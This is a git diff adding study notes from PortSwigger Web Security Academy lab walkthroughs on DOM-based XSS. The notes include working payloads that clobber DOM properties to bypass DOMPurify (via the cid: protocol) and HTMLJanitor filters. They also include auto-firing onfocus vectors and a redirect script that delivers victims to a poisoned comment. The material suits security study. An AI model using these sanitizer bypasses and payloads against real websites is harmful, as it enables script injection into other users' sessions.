@@ -1,6 +1,7 @@
 # DOM-based vulnerabilities
 
 - https://portswigger.net/web-security/dom-based
+- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-clobbering
 
 ## DOM XSS using web messages
 
@@ -94,4 +95,50 @@ Unfortunately autofocusing `a` tag on `cross-origin` `iframe` was blocked, so to
 
 ```
 <iframe src="https://0a5a007d03f480c580c803ff00c6004a.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://0a5a007d03f480c580c803ff00c6004a.web-security-academy.net';window.x=1;">
+```
+
+## Exploiting DOM clobbering to enable XSS
+
+Using DOM Invader we can quickly discover `defaultAvatar` variable, which is assigned this way `let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}`. Since `window.defaultAvatar` is not set by default when loading a page, and its content is then passed to `innerHtml` sink without sanitization with this reference `defaultAvatar.avatar`, which makes it a good sink.
+
+Now we can try to clobber this value by creating the comment with proper html. Below try was not successful, because the content was URL encoded, which did not allow breaking out of the string:
+
+```
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href='X" onerror=alert(1) x="'>
+```
+
+DOMPurify allows you to use the `cid:` protocol, which does not URL-encode double-quotes. This means you can inject an encoded double-quote that will be decoded at runtime. Using this the below payload worked and the next added comment had malicious avatar performing XSS.
+
+```
+<a id=defaultAvatar><a id=defaultAvatar name=avatar href='cid:X" onerror=alert(1) x="'>
+```
+
+## Clobbering DOM attributes to bypass HTML filters
+
+We can notice the website uses `HTMLJanitor` for cleaning the body of the comments and the autor before passing them to `innerHtml` function. Looking at the Janitor config, we can notice allowed tags and their attributes:
+
+```
+input:{name:true,type:true,value:true},form:{id:true},i:{},b:{},p:{}
+```
+
+Using `form` and `input` tags we can clobber DOM properties, which will bypass the Janitor check. "Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property can be clobbered with the `input` element, the filter will loop through the input element instead. As the input element has an undefined length, the conditions for the for loop of the filter (for example `i<element.attributes.length`) will not be met, and the filter will simply move on to the next element instead. This results in the blacklisted attribute being ignored altogether by the filter"
+
+Testing out theory with the code below proved that we can bypass the Janitor and execute code with onclick event:
+
+```
+<form onclick=alert(1)><input id=attributes>Click me
+```
+
+In order to auto execute code we can use `tabindex` - which will make the tag focusable - `autofocus` and `onfocus` event attributes. Update the comment to this:
+
+```
+<form tabindex=0 autofocus onfocus=print()><input id=attributes>
+```
+
+Now since every person accesing this page will trigger XSS, we can simply deliver to the victim link with redirection to this post with malicious comment.
+
+```
+<script>
+location = "https://0a8000a1042868a2826ee20f00330052.web-security-academy.net/post?postId=5"
+</script>
 ```
